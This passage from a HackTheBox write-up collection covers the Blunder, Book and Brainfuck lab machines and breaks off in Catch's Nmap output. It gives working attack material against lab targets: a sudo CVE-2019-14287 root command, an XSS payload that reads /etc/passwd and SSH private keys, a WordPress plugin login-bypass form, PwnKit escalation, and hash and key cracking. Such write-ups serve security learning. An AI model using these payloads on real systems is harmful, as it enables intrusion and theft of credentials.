file <code>/var/www/bludit-3.10.0a/bl-content/databases</code> I found a hash that can be cracked. I now have credentials for the user <code>hugo</code>:</p> <pre><code>hugo:Password120\n</code></pre>"},{"location":"HackTheBox/Blunder/#pwned","title":"Pwned!","text":"<p>The user <code>hugo</code> can execute <code>/bin/bash</code> as any user but <code>root</code>.</p> <pre><code>hugo@blunder:~$ sudo -l\nPassword: \nMatching Defaults entries for hugo on blunder:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser hugo may run the following commands on blunder:\n    (ALL, !root) /bin/bash\n</code></pre> <p>At least that is the idea of the configuration. The <code>sudo</code> version installed is vulnerable to the CVE-2019-14287, allowing us to get <code>root</code> access:</p> <pre><code>hugo@blunder:~$ sudo -u#-1 /bin/bash\nPassword: \nroot@blunder:/home/hugo#\n</code></pre>"},{"location":"HackTheBox/Book/","title":"Book","text":""},{"location":"HackTheBox/Book/#nmap","title":"Nmap","text":"<p>As always let's see what Nmap has to say.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- --min-rate=1000 10.10.10.176\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-19 19:39 CET\nNmap scan report for 10.10.10.176\nHost is up (0.057s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 66.92 seconds\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p 22,80 -sC -sV 10.10.10.176\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-19 19:41 CET\nNmap scan report for 10.10.10.176\nHost is up (0.069s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 f7fc5799f682e003d603bc09430155b7 (RSA)\n|   256 a3e5d174c48ae8c852c717834a5431bd (ECDSA)\n|_  256 e3626872e2c0ae46673dcb46bf69b96a (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: LIBRARY - Read | Learn | Have Fun\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.30 seconds\n</code></pre> <p>Since only port 80 and 22 are open I guess we start with port 80.</p>"},{"location":"HackTheBox/Book/#port-80","title":"Port 80","text":""},{"location":"HackTheBox/Book/#enumeration-time","title":"Enumeration time","text":"<p>First of all, let's launch a directory brute force to see a bit how the application looks like.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ feroxbuster -u http://10.10.10.176/ -w Wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -x php -b PHPSESSID=h4na4k7g35a1kvro6u8uglbogu \n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher \ud83e\udd13                 ver: 2.7.2\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfaf  Target Url            \u2502 http://10.10.10.176/\n \ud83d\ude80  Threads               \u2502 50\n \ud83d\udcd6  Wordlist              \u2502 Wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt\n \ud83d\udc4c  Status Codes          \u2502 [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]\n \ud83d\udca5  Timeout (secs)        \u2502 7\n \ud83e\udda1  User-Agent            \u2502 feroxbuster/2.7.2\n \ud83d\udc89  Config File           \u2502 /etc/feroxbuster/ferox-config.toml\n \ud83e\udd2f  Header                \u2502 Cookie: PHPSESSID=h4na4k7g35a1kvro6u8uglbogu\n \ud83d\udcb2  Extensions            \u2502 [php]\n \ud83c\udfc1  HTTP methods          \u2502 [GET]\n \ud83d\udd03  Recursion Depth       \u2502 4\n \ud83c\udf89  New Version Available \u2502 https://github.com/epi052/feroxbuster/releases/latest\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfc1  Press [ENTER] to use the Scan Management Menu\u2122\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n302      GET        0l        0w        0c http://10.10.10.176/ =&gt; home.php\n301      GET        9l       28w      312c http://10.10.10.176/admin =&gt; http://10.10.10.176/admin/\n301      GET        9l       28w      313c http://10.10.10.176/images =&gt; http://10.10.10.176/images/\n200      GET      156l      303w     3026c http://10.10.10.176/contact.php\n403      GET        9l       28w      277c http://10.10.10.176/.php\n200      GET      162l      338w     3501c http://10.10.10.176/search.php\n200      GET        0l        0w        0c http://10.10.10.176/download.php\n302      GET        0l        0w        0c http://10.10.10.176/logout.php =&gt; index.php\n301      GET        9l       28w      311c http://10.10.10.176/docs =&gt; http://10.10.10.176/docs/\n302      GET        0l        0w        0c http://10.10.10.176/admin/home.php =&gt; index.php\n302      GET        0l        0w        0c http://10.10.10.176/admin/users.php =&gt; index.php\n301      GET        9l       28w      319c http://10.10.10.176/admin/export =&gt; http://10.10.10.176/admin/export/\n302      GET        0l        0w        0c http://10.10.10.176/admin/feedback.php =&gt; index.php\n200      GET        0l        0w        0c http://10.10.10.176/db.php\n302      GET        0l        0w        0c http://10.10.10.176/home.php =&gt; index.php\n302      GET        0l        0w        0c http://10.10.10.176/profile.php =&gt; index.php\n200      GET      321l      683w     6800c http://10.10.10.176/index.php\n302      GET        0l        0w        0c http://10.10.10.176/feedback.php =&gt; index.php\n403      GET        9l       28w      277c http://10.10.10.176/admin/.php\n302      GET        0l        0w        0c http://10.10.10.176/books.php =&gt; index.php\n302      GET        0l        0w        0c http://10.10.10.176/settings.php =&gt; index.php\n301      GET        9l       28w      319c http://10.10.10.176/admin/vendor =&gt; http://10.10.10.176/admin/vendor/\n302      GET        0l        0w        0c http://10.10.10.176/admin/messages.php =&gt; index.php\n302      GET        0l        0w        0c http://10.10.10.176/collections.php =&gt; index.php\n302      GET        0l        0w        0c http://10.10.10.176/admin/collections.php =&gt; index.php\n403      GET        9l       28w      277c http://10.10.10.176/server-status\n200      GET        0l        0w        0c http://10.10.10.176/admin/vendor/autoload.php\n301      GET        9l       28w      328c http://10.10.10.176/admin/vendor/composer =&gt; http://10.10.10.176/admin/vendor/composer/\n200      GET       56l      398w     2918c http://10.10.10.176/admin/vendor/composer/LICENSE\n[####################] - 3m    420000/420000  0s      found:29      errors:415\n</code></pre> <p>There is an administration area but I don't have credentials for that. Since the application allows us to sign up I started by doing that. </p> <p>Basically, this is like a library website or something like that. You can send feedback or even upload a book, i will check that functionality later. Something I noticed was that the administrator email was in the contact section: <code>admin@book.htb</code>. After a bit playing with my username I noticed that the page was only saving a certain number of characters, if that is case with the email when creating a new user maybe we can abuse a SQL truncation attack to steal the administrator account.</p>"},{"location":"HackTheBox/Book/#we-are-admin","title":"We are admin!","text":"<p>Using a payload like <code>admin@book.htb               a</code> as the email while signing up, allowed me to get change the administrator password and access the administration panel.</p> <p>Looks like the admin can export the whole book list and get information about the name of them. I mean, the user has a feature to upload a book file that should be reviwed by the administrator but Im not able to find it anywhere. After trying for a bit, I was able to get my file into the export. Looks like its name is changed to a randon integer and put into <code>/docs</code>. I though that my file was deleted after some seconds but looks like the file itself is not deleted, just deleted from the export thing.</p> <p>Well that makes things... easier I guess? The application is renaming my file to <code>.pdf</code> so I cannot really upload a webshell sadly. I decided to try something, what about server side XSS? My input is used to generate that PDF so maybe it works, using burp I uploaded a random file with this payload as title:</p> <pre><code>&lt;script&gt;\n    xhzeem = new XMLHttpRequest();\n    xhzeem.onload = function(){document.write(this.responseText);}\n    xhzeem.onerror = function(){document.write('failed!')}\n    xhzeem.open(\"GET\",\"file:///etc/passwd\");\n    xhzeem.send();\n&lt;/script&gt;\n</code></pre> <p>Generating the export I get all the <code>/etc/passwd</code> file! Now that I know some of the users in the machine, I will try to get a private key. After some try and error, I was able to get the private key for the <code>reader</code> user in <code>/home/reader/.ssh/id_rsa</code>.</p> <p>In order for the PDF to render the content of the key properly, remember to use the <code>&lt;pre&gt;</code> tag:</p> <pre><code>&lt;script&gt;\n    xhzeem = new XMLHttpRequest();\n    xhzeem.onload = function(){document.write(\"&lt;pre&gt;\"+this.responseText+\"&lt;/pre&gt;\");}\n    xhzeem.onerror = function(){document.write('failed!')}\n    xhzeem.open(\"GET\",\"file:///home/reader/.ssh/id_rsa\");\n    xhzeem.send();\n&lt;/script&gt;\n</code></pre>"},{"location":"HackTheBox/Book/#pwned","title":"Pwned!!!","text":"<p>Basically I noticed that <code>pkexec</code> is a SUID binary so this box is probably vulnerable to the PwnKit exploit:</p> <pre><code>reader@book:~$ find / -perm /4000 2&gt; /dev/null\n...\n/usr/bin/pkexec\n/usr/bin/gpasswd\n/usr/bin/chsh\n/usr/bin/newgrp\n/usr/bin/newgidmap\n/usr/bin/newuidmap\n/usr/bin/sudo\n/usr/bin/traceroute6.iputils\n/bin/mount\n/bin/umount\n/bin/fusermount\n/bin/ping\n/bin/su\n</code></pre> <p>I uploaded a binary with it to the box and gg!</p> <pre><code>reader@book:~$ ./PwnKit \nroot@book:/home/reader#\n</code></pre>"},{"location":"HackTheBox/Book/#beyond-root","title":"Beyond root","text":"<p>I decided to check some write ups to see how people solved this box and turns out that my escalation vector was not the intended one (Yeah, what a surprise right?). </p> <p>Well, looks like you can exploit a vulnerability in logrotate to force it to write into an arbitrary file.</p>"},{"location":"HackTheBox/Brainfuck/","title":"Brainfuck","text":""},{"location":"HackTheBox/Brainfuck/#nmap-scan","title":"Nmap scan","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Brainfuck]\n\u2514\u2500$ sudo nmap -p- --min-rate 1000 &lt;MACHINE_IP&gt;\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-10-12 08:24 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.051s latency).\nNot shown: 65530 filtered ports\nPORT    STATE SERVICE\n22/tcp  open  ssh\n25/tcp  open  smtp\n110/tcp open  pop3\n143/tcp open  imap\n443/tcp open  https\n\nNmap done: 1 IP address (1 host up) scanned in 102.62 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Brainfuck]\n\u2514\u2500$ sudo nmap -sC -sV -p22,25,110,143,443 &lt;MACHINE_IP&gt;\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-10-12 08:27 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.053s latency).\n\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)\n|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)\n|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)\n25/tcp  open  smtp     Postfix smtpd\n|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, \n110/tcp open  pop3     Dovecot pop3d\n|_pop3-capabilities: SASL(PLAIN) USER RESP-CODES AUTH-RESP-CODE TOP UIDL PIPELINING CAPA\n143/tcp open  imap     Dovecot imapd\n|_imap-capabilities: ID listed have IDLE ENABLE Pre-login more post-login AUTH=PLAINA0001 LOGIN-REFERRALS OK IMAP4rev1 capabilities SASL-IR LITERAL+\n443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)\n|_http-server-header: nginx/1.10.0 (Ubuntu)\n|_http-title: Welcome to nginx!\n| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR\n| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb\n| Not valid before: 2017-04-13T11:19:29\n|_Not valid after:  2027-04-11T11:19:29\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|_  http/1.1\n| tls-nextprotoneg: \n|_  http/1.1\nService Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 52.79 seconds\n</code></pre> <p>So some interesting things here. First, the SMTP, POP and IMAP services and then I can see some domains for the 443 port web server: <code>brainfuck.htb</code>, <code>www.brainfuck.htb</code> and <code>sup3rs3cr3t.brainfuck.htb</code>. Let's start with the port 443.</p>"},{"location":"HackTheBox/Brainfuck/#port-443","title":"Port 443","text":"<p>Before starting the enumeration process, I added the domains that Nmap found earlier to my <code>hosts</code> file. Accessing to <code>https://&lt;MACHINE_IP&gt;/</code> just shows the Nginx default page so we can directly go for the domains found.</p>"},{"location":"HackTheBox/Brainfuck/#brainfuckhtb-and-wwwbrainfuckhtb","title":"brainfuck.htb and www.brainfuck.htb","text":"<p>Since the <code>www.brainfuck.htb</code> domain will redirect to <code>brainfuck.htb</code> we can consider them the same thing.</p> <p>The page is a Wordpress site where only one post was created. In the post, we can get some information. First we know that there is a Wordpress user called <code>admin</code> and second there is an email: <code>orestis@brainfuck.htb</code> that could be useful later.</p> <p>The Wordpress version is the 4.7.3, what is really old. Maybe we have something to do here:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ searchsploit Wordpress Core 4.7.3\n------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                             |  Path\n------------------------------------------------------------------------------------------- ---------------------------------\nWordPress Core &lt; 4.7.4 - Unauthorized Password Reset                                       | linux/webapps/41963.txt\nWordPress Core &lt; 4.9.6 - (Authenticated) Arbitrary File Deletion                           | php/webapps/44949.txt\nWordPress Core &lt; 5.2.3 - Viewing Unauthenticated/Password/Private Posts                    | multiple/webapps/47690.md\nWordPress Core &lt; 5.3.x - 'xmlrpc.php' Denial of Service                                    | php/dos/47800.py\n------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\nPapers: No Results\n</code></pre> <p>The unauthorized password reset one needs the Wordpress to be accessed using the host IP address and this is not the case, so nothing to do here.</p> <p>According to <code>wpscan</code> WordPress Plugin WP Support Plus with 7.1.3 is installed. It is outdated so let's check for vulnerabilities:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Brainfuck]\n\u2514\u2500$ searchsploit WordPress Plugin WP Support Plus 7.1.3     \n----------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                     |  Path\n----------------------------------------------------------------------------------- ---------------------------------\nWordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escala | php/webapps/41006.txt\nWordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection    | php/webapps/40939.txt\n----------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\nPapers: No Results\n</code></pre> <p>The first one sounds nice, I built the PoC for our target:</p> <pre><code>&lt;html&gt;\n    &lt;form method=\"post\" action=\"https://brainfuck.htb/wp-admin/admin-ajax.php\"&gt;\n        Username: &lt;input type=\"text\" name=\"username\" value=\"admin\"&gt;\n        &lt;input type=\"hidden\" name=\"email\" value=\"orestis@brainfuck.htb\"&gt;\n        &lt;input type=\"hidden\" name=\"action\" value=\"loginGuestFacebook\"&gt;\n        &lt;input type=\"submit\" value=\"Login\"&gt;\n    &lt;/form&gt;\n&lt;/html&gt;\n</code></pre> <p>Opening it in a browser and hitting the login button will bypass the Wordpress login and get access to the dasboard. The problem is that the templates files are not writtable so we can't get RCE with this.</p> <p>After looking around I found that Easy WP SMTP plugin is installed. Checking the plugin settings and changing the password field from the type <code>password</code> to <code>text</code> will reveal all we need to login to the SMTP service: <code>orestis@brainfuck.htb:kHGuERB29DNiNE</code>.</p>"},{"location":"HackTheBox/Brainfuck/#sup3rs3cr3tbrainfuckhtb","title":"sup3rs3cr3t.brainfuck.htb","text":"<p>This page looks like a forum. It allow new users to register so we can login to it. The forum only allows <code>brainfuck.htb</code> emails to register and looks like email confirmation is required to participate in the forum what is not good for us.</p>"},{"location":"HackTheBox/Brainfuck/#port-143","title":"Port 143","text":"<p>Let's try to login to the IMAP service with the credentials we found:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Brainfuck]\n\u2514\u2500$ nc -vn &lt;MACHINE_IP&gt; 143\n(UNKNOWN) [&lt;MACHINE_IP&gt;] 143 (imap2) open\n* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=PLAIN] Dovecot ready.\nA1 LOGIN orestis kHGuERB29DNiNE\nA1 OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SPECIAL-USE] Logged in\n</code></pre> <p>Cool, we are in. Let's check the emails! (I will go with the manual way):</p> <ul> <li>Once logged in, using <code>n namespace</code> we can check the namespaces we have: <pre><code>n namespace\n* NAMESPACE ((\"\" \"/\")) NIL NIL\nn OK Namespace completed.\n</code></pre></li> <li>Now we have to list the folders we have inside the namespace, in our case we need: <code>A1 list \"\" \"*\"</code>: <pre><code>A1 list \"\" \"*\"\n* LIST (\\HasNoChildren) \"/\" INBOX\nA1 OK List completed (0.000 + 0.000 secs).\n</code></pre></li> <li>Cool, in this case only the <code>INBOX</code> folder is available so: <code>g21 SELECT \"INBOX\"</code>: <pre><code>g21 SELECT \"INBOX\"\n* FLAGS (\\Answered \\Flagged \\Deleted \\Seen \\Draft)\n* OK [PERMANENTFLAGS (\\Answered \\Flagged \\Deleted \\Seen \\Draft \\*)] Flags permitted.\n* 3 EXISTS\n* 0 RECENT\n* OK [UNSEEN 3] First unseen.\n* OK [UIDVALIDITY 1493461609] UIDs valid\n* OK [UIDNEXT 6] Predicted next UID\n* OK [HIGHESTMODSEQ 6] Highest\ng21 OK [READ-WRITE] Select completed (0.000 + 0.000 secs).\n</code></pre></li> <li>Let's see what emails ids we have with <code>s search ALL</code>: <pre><code>s search ALL\n* SEARCH 1 2\ns OK Search completed (0.001 + 0.000 secs).\n</code></pre></li> <li>Now to see the emails use: <code>F1 fetch &lt;email_id&gt; RFC822</code> and the email will be displayed.</li> </ul> <p>The email with the id number 2 is interesting:</p> <pre><code>Hi there, your credentials for our \"secret\" forum are below :)\n\nusername: orestis\npassword: kIEnnfEKJ#9UmdO\n\nRegards\n</code></pre> <p>So now we can login to <code>sup3rs3cr3t.brainfuck.htb</code> with <code>orestis:kIEnnfEKJ#9UmdO</code>.</p>"},{"location":"HackTheBox/Brainfuck/#as-orestis-in-the-forum","title":"As orestis in the forum","text":"<p>Now that we can access to this forum, we see some kind of private threads that were hidden. Looks like Orestis is asking the page admin for a SSH key and the admin gave it to him using an encrypted threah.</p> <p>Time to analize the encrypted messages, this is one of them:</p> <pre><code>Mya qutf de buj otv rms dy srd vkdof :)\n\nPieagnm - Jkoijeg nbw zwx mle grwsnn\n</code></pre> <p>Looks like our friend Orestis is signing the messages with: <code>Orestis - Hacking for fun and profit</code> according other messages sent by him. The cipher text could be Vigen\u00e8re, a variation of Caesar, beacause the encrypted sign changes from one message to another.</p> <p>This kind of cipher is vulnerable to a known plaintext attack. Vigen\u00e8re cipher calculate the n-th ciphertext letter by adding the n-th plaintext letter and the n-th key letter in mod 26 (Remember that the used key will be repeated as many times as necessary to be as long as the text). The final operation is: <code>Cn = Pn + Kn mod 26</code> so if we want to get the key we could do <code>Kn = Cn - Pn mod 26</code>.</p> <p>Time for Python!</p> <pre><code>#! /usr/bin/env python3\nimport string\n\nkwnon_plaintext = 'Hackingforfunandprofit'\ncryptogram = 'Jkoijegnbwzwxmlegrwsnn'\nkey = []\n\nfor cryptogram_letter, kwnon_plaintext_letter in zip(cryptogram.lower(), kwnon_plaintext.lower()):\n    # Kn = Cn - Pn mod 26\n    key_letter_num = (string.ascii_lowercase.find(cryptogram_letter) - string.ascii_lowercase.find(kwnon_plaintext_letter)) % 26\n    key.append(string.ascii_lowercase[key_letter_num])\n\nkey = ''.join(key)\nprint(f'Key --&gt; {key}')\n</code></pre> <p>Executing this code will result in: <code>Key --&gt; ckmybrainfuckmybrainfu</code>. Since we know the key is repeated to be as long as the text, the key is: <code>fuckmybrain</code>. With that, we can use Cyberchef or something like that to get the messages in plaintext. Here it is the interesting one:</p> <pre><code>There you go you stupid fuck, I hope you remember your key password because I dont :)\n\nhttps://&lt;MACHINE_IP&gt;/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa\n</code></pre> <p>Going to that URL will download a private SSH key for us. Orestis say it will brute force his key so I guess we would need to do the same.</p>"},{"location":"HackTheBox/Brainfuck/#brute-forcing-the-key","title":"Brute forcing the key","text":"<p>The first thing we need is to transform the private key to something john the ripper can read: <pre><code>/usr/share/john/ssh2john.py id_rsa &gt; hash\n</code></pre></p> <p>Now that we have a file with the hash to crack we can just: <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Brainfuck]\n\u2514\u2500$ john --wordlist=~/Wordlists/rockyou.txt hash                                                               130 \u2a2f\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 8 OpenMP threads\nNote: This format may emit false positives, so it will keep trying even after\nfinding a possible candidate.\nPress 'q' or Ctrl-C to abort, almost any other key for status\n3poulakia!       (id_rsa)\nWarning: Only 2 candidates left, minimum 8 needed for performance.\n1g 0:00:00:02 DONE (2021-10-12 15:31) 0.4524g/s 6489Kp/s 6489Kc/s 6489KC/sa6_123..*7\u00a1Vamos!\nSession completed\n</code></pre></p> <p>And the password is <code>3poulakia!</code>, we can now login through SSH.</p>"},{"location":"HackTheBox/Brainfuck/#in-the-machine-as-orestis","title":"In the machine as orestis","text":"<p>We can get the user flag now under <code>/home/orestis/user.txt</code>. After that we see something interesting, a file called <code>encrypt.sage</code> that encrypts the root flag using RSA, the thing is that the program print all the generated values we need for decription to a file called <code>debug.txt</code>.</p>"},{"location":"HackTheBox/Brainfuck/#getting-the-root-flag","title":"Getting the root flag","text":"<p>In order to get the root flag we need to use the data in the <code>debug.txt</code> file to decrypt the root flag located in the <code>output.txt</code>. </p> <p>Checking how RSA works, the first thing we have to know is that the public key is formmed by two numbers: <code>(e, n)</code> and the private key is formmed by another two numbers <code>(d, n)</code>. The letters used to represent the numbers are the same as the used in the code (And also in the RSA specification). The code is using the public key to encrypt the flag and prints to the <code>debug.txt</code> file the variables <code>p</code>, <code>q</code> and <code>e</code>.</p> <p>We already have the private key <code>n</code> value because <code>p*q = n</code> so we have to get <code>d</code>. This variable can be calculated from this formula: <code>d*e mod phi = 1</code> (Modular inverse) where the value <code>phi</code> is <code>(p-1)*(q-1)</code>.</p> <p>Once we get the right <code>d</code> we can calculate <code>cryptogram^d mod N</code> to decrypt the flag. I wrote this Python code for all this calculations:</p> <pre><code>#! /usr/bin/env python3\n\np = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307\nq = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079\ne = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997\nn = p*q\nphi = (p-1)*(q-1)\nd = pow(e, -1, phi) # Modular inverse\n\nencrypted_root_flag = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182\nflag = pow(encrypted_root_flag, d ,n)\nflag = bytes.fromhex(hex(flag)[2::]).decode()\n\nprint(f'Root flag --&gt; {flag}')\n</code></pre> <p>Executing the code above will expose the root flag!</p>"},{"location":"HackTheBox/Catch/","title":"Catch","text":""},{"location":"HackTheBox/Catch/#nmap-scan","title":"Nmap scan","text":"<p>As always a basic full port scan followed by a more detailed one of the open ports:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- --min-rate 1000 10.10.11.150\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-28 07:57 EDT\nNmap scan report for 10.10.11.150\nHost is up (0.057s latency).\nNot shown: 65530 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3000/tcp open  ppp\n5000/tcp open  upnp\n8000/tcp open  http-alt\n\nNmap done: 1 IP address (1 host up) scanned in 21.41 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p22,80,3000,5000,8000 -sC -sV 10.10.11.150\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-28 07:59 EDT\nNmap scan report for 10.10.11.150\nHost is up (0.058s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Catch Global Systems\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n3000/tcp open  ppp?\n| fingerprint-strings: \n|   GenericLines, Help, RTSPRequest: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest: \n|     HTTP/1.0 200 OK\n|     Content-Type: text/html; charset=UTF-8\n|     Set-Cookie: i_like_gitea=dc1f63d531e6bb29; Path=/; HttpOnly\n|     Set-Cookie: _csrf=zOsNQVYrG-dW_xmT_61Rbb52Rk86MTY1MzczOTE2MzMzMjg1NDI0Nw; Path=/; Expires=Sun, 29 May 2022 11:59:23 GMT; HttpOnly; SameSite=Lax\n|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly\n|     X-Frame-Options: SAMEORIGIN\n|     Date: Sat, 28 May 2022 11:59:23 GMT\n|     &lt;!DOCTYPE html&gt;\n|     &lt;html lang=\"en-US\" class=\"theme-\"&gt;\n|     &lt;head data-suburl=\"\"&gt;\n|     &lt;meta charset=\"utf-8\"&gt;\n|     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;\n|     &lt;meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"&gt;\n|     &lt;title&gt; Catch Repositories &lt;/title&gt;\n|     &lt;link rel=\"manifest\" href=\"data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz\n|   HTTPOptions: \n|     HTTP/1.0 405 Method Not Allowed\n|     Set-Cookie: i_like_gitea=50ba29214c8efe8a; Path=/; HttpOnly\n|     Set-Cookie: _csrf=7ncKrYlCix8LzYmNrgSbZOGBG9o6MTY1MzczOTE2ODY4MTE4OTAwOQ; Path=/; Expires=Sun, 29 May 2022 11:59:28 GMT; HttpOnly; 